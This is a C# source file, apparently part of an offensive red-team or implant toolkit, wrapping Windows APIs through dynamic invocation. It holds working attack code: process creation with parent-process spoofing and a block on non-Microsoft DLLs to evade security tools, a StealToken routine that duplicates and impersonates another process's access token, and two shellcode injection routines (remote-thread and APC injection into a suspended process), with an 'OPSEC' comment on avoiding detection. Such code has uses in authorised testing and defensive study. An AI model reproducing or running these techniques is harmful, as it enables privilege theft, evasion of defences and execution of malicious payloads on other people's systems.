using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using WinAPI.Data.AdvApi;
using WinAPI.Data.Kernel32;
using WinAPI.Wrapper;

namespace WinAPI.DInvoke
{
    internal static class Wrapper
    {
        public static bool CloseHandle(IntPtr handle)
        {
            return Kernel32.CloseHandle(handle);
        }
        public static ProcessCreationResult CreateProcess(ProcessCreationParameters parms)
        {
            var startupInfoEx = new STARTUPINFOEX();
            startupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfoEx);
            var pInfo = new PROCESS_INFORMATION();
            var outPipe_w = IntPtr.Zero;
            PROCESS_CREATION_FLAGS creationFlags = 0;

            var result = new ProcessCreationResult();
            IntPtr hParentProcess = IntPtr.Zero;
            IntPtr parentAttributeValue = IntPtr.Zero;
            IntPtr blockDllAttributeValue = IntPtr.Zero;
            try
            {
                int attributeCount = 1; // Block DLL policy
                if (parms.ParentProcessId != 0)
                    attributeCount++;

                _ = Kernel32.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, attributeCount);

                const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
                const int MITIGATION_POLICY = 0x20007;

                blockDllAttributeValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(blockDllAttributeValue, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

                _ = Kernel32.UpdateProcThreadAttribute(
                    ref startupInfoEx.lpAttributeList,
                    (IntPtr)MITIGATION_POLICY,
                    ref blockDllAttributeValue);

                if (parms.ParentProcessId != 0)
                {
                    hParentProcess = Native.NtOpenProcess(parms.ParentProcessId, ProcessAccessFlags.PROCESS_CREATE_PROCESS);
                    if (hParentProcess != IntPtr.Zero)
                    {
                        parentAttributeValue = Marshal.AllocHGlobal(IntPtr.Size);
                        Marshal.WriteIntPtr(parentAttributeValue, hParentProcess);

                        _ = Kernel32.UpdateProcThreadAttribute(
                            ref startupInfoEx.lpAttributeList,
                            (IntPtr)0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
                            ref parentAttributeValue);
                    }
                }

                if (parms.RedirectOutput)
                {
                    const uint USE_STD_HANDLES = 0x00000100;

                    SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                    saAttr.bInheritHandle = true;
                    saAttr.lpSecurityDescriptor = IntPtr.Zero;

                    Kernel32.CreatePipe(out var outPipe_rd, out outPipe_w, ref saAttr);

                    // Ensure the read handle to the pipe for STDOUT is not inherited.
                    Kernel32.SetHandleInformation(outPipe_rd, HANDLE_FLAGS.INHERIT, 0);


                    startupInfoEx.StartupInfo.hStdError = outPipe_w;
                    startupInfoEx.StartupInfo.hStdOutput = outPipe_w;
                    //sInfoEx.StartupInfo.hStdInput = inPipe_rd;

                    result.OutPipeHandle = outPipe_rd;

                    startupInfoEx.StartupInfo.dwFlags |= USE_STD_HANDLES;
                }


                if (parms.CreateSuspended)
                    creationFlags |= PROCESS_CREATION_FLAGS.CREATE_SUSPENDED;

                if (parms.CreateNoWindow)
                    creationFlags |= PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW;


                if (parms.Credentials != null)
                {
                    if (!Advapi.CreateProcessWithLogonW(parms.Credentials.Username, parms.Credentials.Domain, parms.Credentials.Password, LogonFlags.LogonWithProfile, parms.Application, parms.Command, creationFlags, IntPtr.Zero, parms.CurrentDirectory, ref startupInfoEx, out pInfo))
                        throw new InvalidOperationException($"Error in CreateProcessWithLogonW : {Marshal.GetLastWin32Error()}");
                }
                else if (parms.Token != null && !parms.Token.IsInvalid)
                {

                    if (!Advapi.CreateProcessWithTokenW(parms.Token.DangerousGetHandle(), LogonFlags.LogonWithProfile, parms.Application, parms.Command, creationFlags, IntPtr.Zero, parms.CurrentDirectory, ref startupInfoEx, out pInfo))
                        throw new InvalidOperationException($"Error in CreateProcessWithTokenW : {Marshal.GetLastWin32Error()}");
                }
                else
                {
                    creationFlags |= PROCESS_CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT;
                    if (!Kernel32.CreateProcessW(parms.Application, parms.Command, (uint)creationFlags, parms.CurrentDirectory, ref startupInfoEx, out pInfo, parms.RedirectOutput))
                        throw new InvalidOperationException($"Error in CreateProcessW : {Marshal.GetLastWin32Error()}");
                }

                result.ProcessHandle = pInfo.hProcess;
                result.ThreadHandle = pInfo.hThread;
                result.ProcessId = pInfo.dwProcessId;

            }
            finally
            {
                // Free the attribute list
                if (startupInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    Kernel32.DeleteProcThreadAttributeList(ref startupInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                }
                if (blockDllAttributeValue != IntPtr.Zero)
                    Marshal.FreeHGlobal(blockDllAttributeValue);
                if (parentAttributeValue != IntPtr.Zero)
                    Marshal.FreeHGlobal(parentAttributeValue);
                Kernel32.CloseHandle(outPipe_w);
                if (hParentProcess != IntPtr.Zero)
                    Kernel32.CloseHandle(hParentProcess);
            }
            return result;
        }

        public static SafeTokenHandle StealToken(uint processId)
        {
            var process = Process.GetProcessById((int)processId);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;

            try
            {
                //open handle to token
                if (!Advapi.OpenProcessToken(process.Handle, DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                    throw new InvalidOperationException($"Failed to open process token");


                //duplicate  token
                var sa = new SECURITY_ATTRIBUTES();
                if (!Advapi.DuplicateTokenEx(hToken, TokenAccess.TOKEN_ALL_ACCESS, ref sa, SecurityImpersonationLevel.SECURITY_IMPERSONATION, TokenType.TOKEN_IMPERSONATION, out hTokenDup))
                {
                    Kernel32.CloseHandle(hToken);
                    process.Dispose();
                    throw new InvalidOperationException($"Failed to duplicate token");
                }

                //impersonate Token
                if (!Advapi.ImpersonateLoggedOnUser(hTokenDup))
                    throw new InvalidOperationException($"Failed to impersonate token");

                //var identity = new WindowsIdentity(hTokenDup);
                return new SafeTokenHandle(hTokenDup, true);
            }
            finally
            {
                if (hToken != IntPtr.Zero)
                    Kernel32.CloseHandle(hToken);
                process.Dispose();
            }
        }

        public static byte[] ReadFromPipe(IntPtr pipe, uint buffSize = 1024)
        {
            if (!Kernel32.ReadFile(pipe, out var buff, buffSize))
            {
                int lastError = Marshal.GetLastWin32Error();
                // 109 = ERROR_BROKEN_PIPE : fin normale du pipe (côté écriture fermé)
                // 0  = pas d'erreur réelle / EOF
                if (lastError == 109 || lastError == 0)
                    return null;
                throw new InvalidOperationException($"Failed reading pipe : {lastError}");
            }

            if (buff == null || buff.Length == 0)
                return null;

            return buff;
        }

        public static void InjectCreateRemoteThread(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, int entrypointOffset = 0)
        {
            var baseAddress = Kernel32.VirtualAllocEx(
                processHandle,
                IntPtr.Zero,
                shellcode.Length,
                AllocationType.Commit |  AllocationType.Reserve,
                MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
                throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");


            IntPtr bytesWritten = IntPtr.Zero;
            if (!Kernel32.WriteProcessMemory(processHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");

            if (bytesWritten.ToInt32() != shellcode.Length)
                throw new InvalidOperationException($"Failed to write All the shellcode into the process");

            if (!Kernel32.VirtualProtectEx(
                processHandle,
                baseAddress,
                shellcode.Length,
                MemoryProtection.ExecuteRead,
                out _))
            {
                throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
            }

            IntPtr threadres = IntPtr.Zero;

            IntPtr thread = Kernel32.CreateRemoteThread(processHandle, IntPtr.Zero, 0, baseAddress + entrypointOffset, IntPtr.Zero, 0, out threadres);

            if (thread == IntPtr.Zero)
                throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
        }

        public static void InjectProcessHollowingWithAPC(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, int entrypointOffset = 0)
        {
            // OPSEC: allocate RW, write shellcode, then flip to RX (avoid RWX allocation)
            var baseAddress = Kernel32.VirtualAllocEx(
                processHandle,
                IntPtr.Zero,
                shellcode.Length,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
                throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");

            IntPtr bytesWritten = IntPtr.Zero;
            if (!Kernel32.WriteProcessMemory(processHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");

            if (bytesWritten.ToInt32() != shellcode.Length)
                throw new InvalidOperationException($"Failed to write All the shellcode into the process");

            if (!Kernel32.VirtualProtectEx(
                processHandle,
                baseAddress,
                shellcode.Length,
                MemoryProtection.ExecuteRead,
                out _))
            {
                throw new InvalidOperationException($"Failed to change memory to execute, error code: {Marshal.GetLastWin32Error()}");
            }

            _ = Native.NtQueueApcThread(
                threadHandle,
                baseAddress + entrypointOffset,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            _ = Native.NtResumeThread(threadHandle);
        }


        public static IntPtr OpenProcess(uint processId, ProcessAccessFlags desiredAccess)
        {
            return Native.NtOpenProcess(processId, desiredAccess);
        }
    }
}
